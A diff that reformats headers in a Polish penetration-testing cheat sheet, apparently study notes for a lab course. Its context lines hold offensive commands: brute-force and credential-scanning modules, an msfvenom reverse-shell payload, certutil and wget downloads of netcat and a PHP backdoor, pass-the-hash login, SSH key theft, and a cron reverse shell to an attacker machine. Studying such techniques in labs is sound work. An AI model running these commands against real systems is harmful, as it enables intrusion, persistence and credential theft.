@@ -6,9 +6,9 @@ PIVOTING:
 jak robisz autoroute to daj na adres ip maszyny, do której się chcesz dostać, ewentualnie na ip widocznego na interfejsie pierwszej maszyny
 
 
-Lists:
+# Lists:
 
-a)users:
+## a)users:
 
 /usr/share/metasploit-framework/data/wordlists/common_users.txt
 
@@ -25,7 +25,7 @@ vagrant
 search smtp_enum # pobranie userów po SMTP
 
 
-b)passwords:
+## b)passwords:
 
 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 
@@ -36,7 +36,7 @@ b)passwords:
 /usr/share/wordlists/rockyou.txt.gz
 
 
-c)for cracking:
+## c)for cracking:
 
 auxiliary/scanner/http/http_login
 
@@ -45,7 +45,7 @@ http/dir_scanner
 auxiliary/scanner/winrm/winrm_login
 
 
-d)files, dirs:
+## d)files, dirs:
 
 /usr/share/metasploit-framework/data/wordlists/directory.txt
 
@@ -59,7 +59,7 @@ hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt dem
 
 
 
-vulnerabilities:
+# vulnerabilities:
 
 * jak nie mas pomysłu to są 3 opcje: wpisujesz wersje w gogle i słowa exploit lub cve | searchsploit wersja | moduł metasplota suggester czy jakoś tak
   
@@ -101,7 +101,7 @@ ProcessMaker HTTP -  exploit/multi/http/process_maker_exec
 
 
 
-webshells, reverse shells:
+# webshells, reverse shells:
 
 /usr/share/webshells/php/php-backdoor.php
 
@@ -117,7 +117,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -f exe > pay
 
 
 
-usefull:
+# usefull:
 
 post/multi/manage/shell_to_meterpreter
 
@@ -155,7 +155,7 @@ https://github.com/hfiref0x/UACME
 
 
 
-interesting paths:
+# interesting paths:
 
 /wamp/www/wordpress/wp-config.php
 
@@ -165,7 +165,7 @@ C:\wamp\alias\phpmyadmin.conf
 
 
 
-privilege esc:
+# privilege esc:
 
 linux - ps aux - szukasz procesu chkrootkit
 
@@ -212,7 +212,7 @@ windows - crackmapexec smb ip -u Administrator -H "NTLM hash" # zalogowanie się
 
 
 
-transfering files:
+# transfering files:
 
 certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe
 
@@ -228,7 +228,7 @@ wget http://ip/php-backdoor.php
 
 
 
-persistence:
+# persistence:
 
 windows - getgui
 
@@ -241,7 +241,7 @@ linux - scp student@192.37.104.3:~/.ssh/id_rsa , a potem ssh -i id_rsa student@1
 *linux - echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip_kali/1234 0>&1'" > cron (TO JEST NAJLEPSZE)
 
 
-fast login:
+# fast login:
 
 scanner/ssh/ssh_login
 
